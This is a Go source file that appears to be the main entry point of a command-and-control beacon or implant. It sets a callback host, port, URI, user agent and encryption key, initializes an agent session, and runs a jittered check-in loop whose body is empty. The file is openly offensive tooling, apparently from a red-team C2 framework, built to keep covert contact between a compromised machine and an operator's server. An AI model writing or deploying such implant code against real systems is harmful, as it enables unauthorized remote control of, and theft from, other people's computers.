package main

import (
	"dingo/initialization"
	"encoding/binary"
	"os"
	"strconv"
	"time"

	hg "github.com/deranged0tter/hellsgopher"
	"github.com/lthibault/jitterbug"
)

var (
	sSLEEP        string                         // whats edited by the go compiler
	sJITTER       string                         // whats edited by the go compiler
	SLEEP, _             = strconv.Atoi(sSLEEP)  // interval between callbacks
	JITTER, _            = strconv.Atoi(sJITTER) // +- time in callbacks
	RHOST         string = "127.0.0.1"           // host to callback to
	RPORT         string = "80"                  // port to callback to
	LISTENER_NAME string = "example listener"    // name of listener calling back to
	BEACON_NAME   string = "example beacon"      // name of the beacon this agent is from
	USERAGENT     string = "bingoc2/1.0.0"       // useragent of callback
	URI           string = "index.php"           // uri to callback to
	sKEY          string                         // key for encryption
	bKEY                 = make([]byte, 32)      // key for encryption in []byte (useable version)

	AgentID string = hg.RandomStr(4) // ID of agent (used by server to identify who is calling)
)

func main() {
	sleep := SLEEP
	nKEY, _ := strconv.ParseUint(sKEY, 10, 64)
	binary.LittleEndian.PutUint64(bKEY, uint64(nKEY))

	// initiliaze sessions
	err := initialization.InitAgent(RHOST, RPORT, URI, sleep, JITTER, LISTENER_NAME, AgentID, USERAGENT, bKEY, BEACON_NAME)
	if err != nil {
		os.Exit(1)
	}

	// create ticker for callbacks with sleep and jitter
	ticker := jitterbug.New(
		time.Second*time.Duration(sleep),
		&jitterbug.Norm{Stdev: time.Second * time.Duration(JITTER)},
	)

	// checkin with server based on ticker
	for range ticker.C {

	}
}
